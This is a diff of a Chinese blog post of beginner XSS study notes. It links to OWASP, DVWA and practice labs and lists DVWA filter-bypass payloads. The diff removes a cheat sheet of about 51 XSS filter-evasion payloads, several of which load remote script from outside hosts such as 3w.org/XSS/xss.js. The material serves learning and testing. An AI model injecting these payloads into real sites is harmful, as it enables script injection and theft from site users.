@@ -106,7 +106,7 @@
 <meta property="og:site_name" content="Huha&#39;s Blog">
 <meta property="og:description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-07-24T13:38:29.387Z">
+<meta property="og:updated_time" content="2019-07-24T16:31:45.029Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS入门总结">
 <meta name="twitter:description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
@@ -396,12 +396,24 @@
                 
               
 
-              <time title="创建时间：2019-07-24 21:36:54 / 修改时间：21:38:29" itemprop="dateCreated datePublished" datetime="2019-07-24T21:36:54+08:00">2019-07-24</time>
+              <time title="创建时间：2019-07-24 21:36:54" itemprop="dateCreated datePublished" datetime="2019-07-24T21:36:54+08:00">2019-07-24</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-07-25 00:31:45" itemprop="dateModified" datetime="2019-07-25T00:31:45+08:00">2019-07-25</time>
               
             
           </span>
@@ -452,14 +464,14 @@
       
 
       
-        <h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h4 id="XSS入门介绍"><a href="#XSS入门介绍" class="headerlink" title="XSS入门介绍"></a>XSS入门介绍</h4><p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
-<h4 id="解析器如何工作"><a href="#解析器如何工作" class="headerlink" title="解析器如何工作"></a>解析器如何工作</h4><p>For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a method call inside the script. This happens because the HTML parser runs before the JavaScript parser.</p>
+        <h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h3 id="XSS入门介绍"><a href="#XSS入门介绍" class="headerlink" title="XSS入门介绍"></a>XSS入门介绍</h3><p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
+<h3 id="解析器如何工作"><a href="#解析器如何工作" class="headerlink" title="解析器如何工作"></a>解析器如何工作</h3><p>For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a method call inside the script. This happens because the HTML parser runs before the JavaScript parser.</p>
 <ul>
 <li>XSS解析器就是浏览器</li>
 </ul>
-<h4 id="HTML-entities（HTML-实体）"><a href="#HTML-entities（HTML-实体）" class="headerlink" title="HTML entities（HTML 实体）"></a>HTML entities（HTML 实体）</h4><p>HTML中的保留字符（Reserved characters）都会被替换为HTML实体（&lt;&gt;）<br><a href="https://www.w3schools.com/html/html_entities.asp" target="_blank" rel="noopener">https://www.w3schools.com/html/html_entities.asp</a> </p>
-<h4 id="浏览器如何解码（Freebuf博主）"><a href="#浏览器如何解码（Freebuf博主）" class="headerlink" title="浏览器如何解码（Freebuf博主）"></a>浏览器如何解码（Freebuf博主）</h4><p><a href="https://www.freebuf.com/articles/web/10121.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/10121.html</a></p>
-<h4 id="XSS漏洞复现"><a href="#XSS漏洞复现" class="headerlink" title="XSS漏洞复现"></a>XSS漏洞复现</h4><p><a href="http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS" target="_blank" rel="noopener">http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS</a></p>
+<h3 id="HTML-entities（HTML-实体）"><a href="#HTML-entities（HTML-实体）" class="headerlink" title="HTML entities（HTML 实体）"></a>HTML entities（HTML 实体）</h3><p>HTML中的保留字符（Reserved characters）都会被替换为HTML实体（&lt;&gt;）<br><a href="https://www.w3schools.com/html/html_entities.asp" target="_blank" rel="noopener">https://www.w3schools.com/html/html_entities.asp</a> </p>
+<h3 id="浏览器如何解码（Freebuf博主）"><a href="#浏览器如何解码（Freebuf博主）" class="headerlink" title="浏览器如何解码（Freebuf博主）"></a>浏览器如何解码（Freebuf博主）</h3><p><a href="https://www.freebuf.com/articles/web/10121.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/10121.html</a></p>
+<h3 id="XSS漏洞复现"><a href="#XSS漏洞复现" class="headerlink" title="XSS漏洞复现"></a>XSS漏洞复现</h3><p><a href="http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS" target="_blank" rel="noopener">http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS</a></p>
 <ul>
 <li>&lt; script &gt;标签内的标准弹框语句，不经过数据库存取<br>  alert(1)<br>  alert(“xss”)<br>  alert(/xss/)<br>  alert(‘xss’)</li>
 </ul>
@@ -470,8 +482,8 @@
 <li>DOM复现的绕过语句：<br>‘&gt;&lt; img src=# onerror=”alert(‘XSS’)”&gt;&lt;’<br>‘ onclick=alert(/xss/) //<br>‘ onclick=’alert(/xss/)’     # 单引号双引号都没有关系</li>
 <li>注：<br>“    &gt;testLink    “前面的有个单引号，如果没有明显的引号与前面的属性分开，会与前面的属性结合后再自动添加引号（如果是事件类型），所以可以使用“  空格//  ”分隔，或者直接显示用引号包括事件，如上第二种解决方法。</li>
 </ul>
-<h4 id="DVWA安装："><a href="#DVWA安装：" class="headerlink" title="DVWA安装："></a>DVWA安装：</h4><p><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p>
-<h4 id="DVWA靶场游玩攻略（XSS）："><a href="#DVWA靶场游玩攻略（XSS）：" class="headerlink" title="DVWA靶场游玩攻略（XSS）："></a>DVWA靶场游玩攻略（XSS）：</h4><p><a href="https://www.freebuf.com/articles/web/123779.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/123779.html</a><br><a href="https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/" target="_blank" rel="noopener">https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/</a></p>
+<h3 id="DVWA安装："><a href="#DVWA安装：" class="headerlink" title="DVWA安装："></a>DVWA安装：</h3><p><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p>
+<h3 id="DVWA靶场游玩攻略（XSS）："><a href="#DVWA靶场游玩攻略（XSS）：" class="headerlink" title="DVWA靶场游玩攻略（XSS）："></a>DVWA靶场游玩攻略（XSS）：</h3><p><a href="https://www.freebuf.com/articles/web/123779.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/123779.html</a><br><a href="https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/" target="_blank" rel="noopener">https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/</a></p>
 <p><strong>DVWA XSS Reflected</strong><br>•    过滤了“&lt; script &gt;”标签，使用大小写，双写， 添加src属性绕过</p>
 <p>•    若采用正则匹配过滤“&lt; script &gt;”，之前方法都行不通，考虑使用其他标签：<br>​    iframe<br>​    input<br>     img<br>​    body<br>​    添加src属性，利用鼠标事件（通用）：<br>​    &lt; IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;<br>​    利用error事件，适用img<br>​    &lt; IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt;</p>
 <p>•    htmlspecialchars( $_GET[ ‘name’ ] );无解</p>
@@ -480,7 +492,7 @@
 <p>•    name字段的限制可以通过burp抓包修改</p>
 <p>•    addslashes( $ message ),mysqli_real_escape_string（$ message）,htmlspecialchars( $ message )，多次转义，数据库中的特殊符号带上反斜杠，并且$message中的HTML保留字符被转换为HTML实体，impossible级别</p>
 <p><strong>DVWA DOM XSS</strong><br>•    基于client的XSS漏洞<br>•    the hash symbol(#)不会被服务端接收到（#后面的部分称为fragment）</p>
-<h4 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h4><ul>
+<h3 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h3><ul>
 <li>教程：<br><a href="https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1" target="_blank" rel="noopener">https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1</a><br><a href="https://blog.csdn.net/u011781521/article/details/53895363" target="_blank" rel="noopener">https://blog.csdn.net/u011781521/article/details/53895363</a>  </li>
 <li>window10配置静态文件<br><a href="https://blog.csdn.net/cz_devil/article/details/16826647" target="_blank" rel="noopener">https://blog.csdn.net/cz_devil/article/details/16826647</a><br><a href="https://blog.csdn.net/qq_16241043/article/details/54176442" target="_blank" rel="noopener">https://blog.csdn.net/qq_16241043/article/details/54176442</a></li>
 <li>查看Apache启动失败的错误信息：<br>打开cmd，输入：D:\phpStudy\Apache\binhttpd.exe -t 回车，即显示错误信息</li>
@@ -526,242 +538,13 @@
 <ul>
 <li>注：<br>  编码解码函数参数都可以接收unicode字符，<br>  如果是ASCII范围内，结果返回可打印的字符，<br>  如果超出这个范围，编码正常（可能是unicode模式，可能是utf-8形式），解码都是返回相应的字符<br>  思考：<br>  其次，escape()不对”+”编码。但是我们知道，网页在提交表单的时候，如果有空格，则会被转化为+字符。服    务器处理数据的时候，会把+号处理成空格。所以，使用的时候要小心。</li>
 </ul>
-<h4 id="XSS-game"><a href="#XSS-game" class="headerlink" title="XSS game"></a>XSS game</h4><blockquote>
+<h3 id="XSS-game"><a href="#XSS-game" class="headerlink" title="XSS game"></a>XSS game</h3><blockquote>
 <p><a href="http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html" target="_blank" rel="noopener">http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html</a></p>
 </blockquote>
-<h4 id="Hack-me"><a href="#Hack-me" class="headerlink" title="Hack me"></a>Hack me</h4><p><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me/</a></p>
-<h4 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h4><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p>
-<h4 id="基于DOM的XSS模糊测试论文（基础打好后再看）"><a href="#基于DOM的XSS模糊测试论文（基础打好后再看）" class="headerlink" title="基于DOM的XSS模糊测试论文（基础打好后再看）"></a>基于DOM的XSS模糊测试论文（基础打好后再看）</h4><p><a href="https://www.hindawi.com/journals/jcnc/2018/8159548/" target="_blank" rel="noopener">https://www.hindawi.com/journals/jcnc/2018/8159548/</a></p>
-<h2 id="附常见的XSS攻击方法"><a href="#附常见的XSS攻击方法" class="headerlink" title="附常见的XSS攻击方法"></a>附常见的XSS攻击方法</h2><p>(1)普通的XSS <a href="https://lvtao.net/tag/javascript/" target="_blank" rel="noopener">JavaScript</a>注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Hack-me"><a href="#Hack-me" class="headerlink" title="Hack me"></a>Hack me</h3><p><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me/</a></p>
+<h3 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h3><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p>
+<h3 id="基于DOM的XSS模糊测试论文（基础打好后再看）"><a href="#基于DOM的XSS模糊测试论文（基础打好后再看）" class="headerlink" title="基于DOM的XSS模糊测试论文（基础打好后再看）"></a>基于DOM的XSS模糊测试论文（基础打好后再看）</h3><p><a href="https://www.hindawi.com/journals/jcnc/2018/8159548/" target="_blank" rel="noopener">https://www.hindawi.com/journals/jcnc/2018/8159548/</a></p>
 
-<p>(2)IMG标签XSS使用JavaScript命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=http://3w.org/XSS/xss.js/&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(3)IMG标签无分号无引号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(4)IMG标签大小写不敏感</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(5)HTML编码(必须有分号)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(6)修正缺陷IMG标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(7)formCharCode标签(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(8)UTF-8的Unicode编码(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(10)十六进制编码也是没有分号(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(11)嵌入式标签,将Javascript分开</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(12)嵌入式编码标签,将Javascript分开</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(13)嵌入式换行符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(14)嵌入式回车</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(15)嵌入式多行注入JavaScript,这是XSS极端的例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(16)解决限制字符(要求同页面)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;w.shell&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(17)空字符12-7-1 T00LS - Powered by Discuz! Board</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 2/6</span><br><span class="line"></span><br><span class="line">perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br></pre></td></tr></table></figure>
-
-<p>(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out</span><br></pre></td></tr></table></figure>
-
-<p>(19)Spaces和meta前的IMG标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(20)Non-alpha-non-digit XSS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(21)Non-alpha-non-digit XSS to 2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(22)Non-alpha-non-digit XSS to 3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(23)双开括号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(24)无结束脚本标记(仅火狐等浏览器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(25)无结束脚本标记2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(26)半开的HTML/JavaScript XSS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(27)双开角括号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br></pre></td></tr></table></figure>
-
-<p>(28)无单引号 双引号 分号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;a=/XSS/</span><br><span class="line"></span><br><span class="line">alert(a.source)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(29)换码过滤的JavaScript</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;;alert(&apos;XSS&apos;);//</span><br></pre></td></tr></table></figure>
-
-<p>(30)结束Title标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(31)Input Image</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(32)BODY Image</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(33)BODY标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(34)IMG Dynsrc</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(35)IMG Lowsrc</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(36)BGSOUND</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(37)STYLE sheet</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(38)远程样式表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(39)List-style-image(列表式)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br></pre></td></tr></table></figure>
-
-<p>(40)IMG VBscript</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br></pre></td></tr></table></figure>
-
-<p>(41)META链接url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;</span><br><span class="line"></span><br><span class="line">URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(42)Iframe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(43)Frame</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line"></span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 3/6</span><br></pre></td></tr></table></figure>
-
-<p>(44)Table</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(45)TD</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(46)DIV background-image</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-<br>8&amp;13&amp;12288&amp;65279)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(48)DIV expression</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;width: expression_r(alert(&apos;XSS&apos;));&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(49)STYLE属性分拆表达</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG STYLE=&quot;xss:expression_r(alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(50)匿名STYLE(组成:开角号和一个字母开头)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XSS STYLE=&quot;xss:expression_r(alert(&apos;XSS&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(51)STYLE background-image</p>
